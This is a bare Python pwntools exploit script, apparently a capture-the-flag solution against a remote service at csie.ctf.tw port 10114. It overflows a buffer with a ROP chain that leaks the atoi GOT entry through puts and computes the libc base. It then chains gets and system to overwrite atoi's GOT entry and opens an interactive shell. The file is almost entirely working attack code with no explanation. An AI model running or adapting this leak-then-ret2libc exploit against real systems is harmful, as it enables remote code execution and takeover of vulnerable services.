#!/usr/bin/env python

from pwn import *

import time

r = remote('csie.ctf.tw', 10114)
# r = remote('csie.ctf.tw', 10114)
main = 0x804855c
puts_plt = 0x080483e0
puts_got = 0x0804a020

pop3 = 0x080486dd
pop1 = 0x080486df

read_plt = 0x08048390
read_got = 0x0804a00c

atoi_got = 0x0804a024

r.send( 'A'*104 + p32(puts_plt) + p32(pop3) + p32(1) + p32(atoi_got) + p32(4) + p32(main) + '\n')

write_off = 0x000c2190

atoi_off = 0x000314d0


# bytess = r.recv()[:4]
# print hex(u32(bytess))
base = u32(r.recv()[:4]) - atoi_off

print 'libc base =', hex(base)

system_off = 0x0003fc40
gets_off = 0x00064ae0
puts_off = 0x00065440

system = base + system_off
gets = base + gets_off 


print 'before sleep 5'
time.sleep(3)
print 'go'
ret = 0x0804867c
r.send( p32(ret)*50 + p32(gets) + p32(system) + p32(atoi_got) + p32(atoi_got) + '\n')
# r.send( '4' + '\n')
# print r.recv()[:40]
# r.send( '40' + '\n')
# r.interactive()
# r.interactive()
# print 'before sleep 5'
# time.sleep(3)
# print 'go'
# r.send( 'ls' + '\n')
r.interactive()
# r.interactive()
# print 'hey'



